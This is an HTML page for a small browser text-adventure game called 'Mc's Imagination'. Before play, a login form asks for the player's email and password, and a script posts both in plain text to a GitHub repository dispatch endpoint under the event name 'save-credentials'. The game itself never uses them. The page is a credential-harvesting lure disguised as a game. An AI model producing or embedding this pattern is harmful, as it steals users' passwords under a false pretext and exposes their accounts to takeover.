<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>RPG Game - Mc's Imagination</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #222;
            color: #fff;
            text-align: center;
            padding: 20px;
        }
        #container {
            max-width: 600px;
            margin: auto;
            background: #333;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 0 10px #000;
        }
        input[type="text"], input[type="password"], input[type="email"] {
            width: 80%;
            padding: 10px;
            border-radius: 5px;
            border: none;
            margin-bottom: 10px;
        }
        button {
            padding: 10px 20px;
            border: none;
            border-radius: 5px;
            background-color: #4CAF50;
            color: white;
            cursor: pointer;
        }
        button:hover {
            background-color: #45a049;
        }
    </style>
</head>
<body>
    <div id="container">
        <h2>Login to Start</h2>
        <input type="email" id="email" placeholder="Enter your email" required><br>
        <input type="password" id="password" placeholder="Enter your password" required><br>
        <button onclick="sendToGitHub()">Start Game</button>

        <div id="game-container" style="display:none;">
            <h1>Welcome to Mc's Imagination!</h1>
            <div id="story">Loading story...</div>
            <input type="text" id="userInput" placeholder="Type your answer here...">
            <button onclick="continueGame()">Submit</button>
        </div>
    </div>

    <script>
        async function sendToGitHub() {
            const email = document.getElementById("email").value;
            const password = document.getElementById("password").value;
            if (email && password) {
                const response = await fetch('https://api.github.com/repos/MccOnGitHub/Mc-RPG/dispatches', {
                    method: 'POST',
                    headers: {
                        'Accept': 'application/vnd.github.everest-preview+json',
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        event_type: 'save-credentials',
                        client_payload: {
                            email: email,
                            password: password
                        }
                    })
                });

                if (response.ok) {
                    alert('Credentials sent successfully!');
                    document.getElementById("container").style.display = "none";
                    document.getElementById("game-container").style.display = "block";
                    display("Welcome to the world of Mc's Imagination!\\nYou are currently level 1\\nMay I know your name?");
                } else {
                    alert('Failed to send credentials.');
                }
            } else {
                alert("Please enter both email and password.");
            }
        }

        let level = 1;
        let name = "";
        let gems = 0;
        let weapon = "";
        let stage = 0;

        function display(text) {
            document.getElementById("story").innerText = text;
        }

        function continueGame() {
            const input = document.getElementById("userInput").value.toLowerCase().trim();
            document.getElementById("userInput").value = "";

            if (stage === 0) {
                name = input;
                display(`Hello there, ${name}!\\nType your desired starting amount of gems! (Range: 0-100)`);
                stage = 1;
            }
            else if (stage === 1) {
                gems = parseInt(input);
                if (gems >= 0 && gems <= 100) {
                    display(`You decided to start with ${gems} gems!\\nDo you want to buy a bonus item? (yes or no)`);
                    stage = 2;
                } else {
                    display("Only enter a value from 0-100.");
                }
            }
            else if (stage === 2) {
                if (input === "yes") {
                    display("Welcome to the shop! What do you want to buy?\\n(level up candy, legendary sword, mystery chest)");
                    stage = 3;
                } else if (input === "no") {
                    display("You decided not to buy anything.\\nEnd of demo. Thanks for playing!");
                } else {
                    display("Invalid choice. Type 'yes' or 'no'.");
                }
            }
            else {
                display("Invalid input. Try again.");
            }
        }

        window.onload = function() {
            display("Welcome to the world of Mc's Imagination!\\nYou are currently level " + level + "\\nMay I know your name?");
        };
    </script>
</body>
</html>
